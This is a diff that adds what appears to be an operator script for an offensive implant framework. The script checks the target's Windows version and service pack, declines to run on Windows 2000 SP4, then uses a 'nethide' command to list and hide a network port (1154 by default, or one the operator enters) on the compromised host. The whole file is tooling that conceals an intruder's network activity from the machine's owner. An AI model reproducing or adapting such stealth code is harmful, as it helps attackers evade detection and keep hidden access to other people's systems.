@@ -1,0 +1,93 @@
+# Called from simple.eps
+##########################################################################################
+# 25 Aug 03 - check to see if W2K SP 4 and don't run if it is.  When DOORWAYNAPKIN is 
+#             updated to handle this SP, we'll modify this script again
+##########################################################################################
+##########################################################################################
+# xx xxxxxx xx - Next iterations of changes....
+#
+##########################################################################################
+
+@record on;
+bool $nt4 = true;
+bool $xp = false;
+bool $dc = false;
+bool $sp = false;
+if (`systemversion`) {
+    int $major = GetCmdData("sysVerMajor");    
+    if ($major != 4) {
+		$nt4 = false;
+    }
+
+# Added to test for XP
+    if ($nt4 == false){
+	int $minor = GetCmdData("sysVerMinor");
+    	if ($minor == 1) {
+		$xp = true;
+    	}
+
+    }
+
+    int $product = GetCmdData("sysProduct");
+    if ($product == 2){
+	$dc = true;
+    }
+
+# Added to Test for SP 4 on Win2k
+	if ($nt4 == false){
+		int $major = GetCmdData("sysSPMajor");
+    		if ($major == 4) {
+			$sp = true;
+    		}
+		if ($sp == true) {
+			echo "********** This is a Win2k SP 4 Box, nethide not supported! **********";
+		return false;
+		}
+	
+    }
+
+}
+
+@record off;
+
+string $portToHide="1154";
+bool $showUsage=false;
+
+if ($argc > 2) {
+    $showUsage = true;
+} 
+if ($argc >= 2) {
+	if ($argv[1] == "?") {
+	    $showUsage = true;
+	} else {
+		$portToHide=$argv[1];
+	}
+}
+
+#@record on;
+`nethide -list`;
+#@record off;
+#string $nhOutput=GetCmdData("nhOutput");
+#echo "nethide check gave this: $nhOutput";
+#int $nhPort=GetCmdData("nhPort");
+#
+#int $i=0;
+#while ($i < sizeof($nhPort)) {
+#	echo "Hidden: $nhPort[$i]";
+#	if ($nhPort[$i] == $portToHide) {
+#		echo "Your port is already hidden!";
+#		return true;
+#	}
+#	$i++;
+#}
+
+ifnot (prompt "Do you need to hide a port?") {
+	return true;
+}
+ifnot (prompt "Do you want to hide $portToHide?") {
+	$portToHide=GetInput("What port do you want to hide?");
+}
+`nethide -hide $portToHide`;
+`nethide -list`;
+
+return true;
